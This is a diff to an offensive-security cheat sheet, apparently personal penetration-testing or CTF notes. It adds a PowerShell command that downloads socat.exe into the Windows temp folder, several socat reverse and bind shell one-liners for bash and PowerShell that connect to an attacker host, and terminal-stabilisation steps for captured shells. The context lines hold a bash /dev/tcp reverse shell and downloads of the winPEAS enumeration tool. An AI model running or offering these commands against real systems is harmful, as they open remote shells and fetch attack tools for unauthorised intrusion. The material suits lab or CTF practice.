@@ -209,7 +209,7 @@ pragma table_info(<table_name>);                                                
 
 curl -O http://10.10.14.33:8081/winPEASx64.exe <-UseBasicParsing>                  # Download file by curl
 IWR http://10.10.14.10:9999/winPEASx64.exe -OutFile winPEASx64.exe                 # Download file in PowerShell
-
+Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe    # Download file in PowerShell
 
 ####################################################################################
 
@@ -236,12 +236,29 @@ zip2john \ rar2john                                                             
 bash -c "bash -i >& /dev/tcp/{your_IP}/9001 0>&1"                                   # revers bash via "nc -lvnp 9001"
 
 
-######################## make bash interactive #####################################
+######################## make shell stable\interactive ##############################
 python3 -c 'import pty;pty.spawn("/bin/bash")'        # shell via python
 CTRL+Z
-stty raw -echo
-fg
+stty raw -echo;fg
 export TERM=xterm
+
+rlwrap nc -lvnp <port>
+Ctrl + Z
+stty raw -echo; fg
+
+stty -a
+stty rows <number>
+stty cols <number>
+
+socat TCP-L:<port> -
+socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes                         # Windows PS by socat
+socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"                                   # Linux PS bt socat
+
+socat TCP-L:<PORT> EXEC:powershell.exe,pipes                                        # Windwos binds PS by socat (listener)
+socat TCP-L:<PORT> EXEC:"bash -li"                                                  # Linux binds PS bt socat (listener)      
+socat TCP-L:<port> FILE:`tty`,raw,echo=0                                            # Linux binds PS bt socat (listener)   
+socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
+
 
 ####################### create reversshells util ##################################
 
